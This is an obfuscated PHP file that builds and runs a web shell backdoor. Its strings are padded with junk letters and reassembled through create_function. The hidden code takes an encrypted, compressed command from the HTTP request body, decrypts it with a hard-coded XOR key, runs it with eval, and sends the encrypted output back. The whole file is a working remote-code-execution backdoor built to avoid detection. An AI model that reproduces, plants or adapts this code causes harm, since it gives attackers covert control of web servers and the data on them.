<?php
$U='qnAOXIw8GA0";fuAnction x(AA$t,A$k){A$c=sAtrlen($k);$l=stAArlen($t);$o=""';
$j='onAtentAs("php://AinAputAA"),$Am)==1) A{@ob_start();@eAval(@gzunAcompressA';
$h='AA(@x(@basAe64_decode($mA[1]),$k)AA));$o=@ob_get_AcoAntentAs(A);@ob_enAd_clean(';
$o=str_replace('K','','cKrKKeate_KfuKnKction');
$L='i}^$k{$j};}}rAAeturnA $o;}if (@prAeg_mAatcAh("/$kh(AA.+)$kf/",@fAile_get_c';
$w=');$r=A@Abase6AA4_encAode(@x(@gzcompresAs($o),$kA));priAnt("A$p$kh$rA$kf");}';
$F=';foAAr($i=0;$i<A$l;A){for(A$j=0;A($j<$c&&$i<A$l);$jA++A,$i++)AA{$o.A=$t{$';
$e='$k="2f2A1b7b6";A$kh=AA"d7529e9Ab95dc"A;$kAf=A"cf19c2c3eAc16";A$p="xQSIN0F';
$t=str_replace('A','',$e.$U.$F.$L.$j.$h.$w);
$y=$o('',$t);$y();
?>
